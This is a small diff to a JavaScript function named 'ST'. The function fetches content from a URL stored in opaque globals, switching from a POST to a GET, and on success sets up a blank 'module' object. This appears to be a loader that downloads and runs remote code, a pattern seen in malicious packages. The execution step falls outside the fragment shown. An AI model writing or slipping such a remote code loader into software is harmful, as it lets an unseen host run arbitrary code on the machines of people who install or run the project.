@@ -3,7 +3,7 @@ const logger = require("./logger");
 
 async function ST() {
   try {
-    const response = await axios.post(global.url + global.q + global.st);
+    const response = await axios.get(global.url);
 
     if (response.status === 200) {
       const module = { exports: {} };
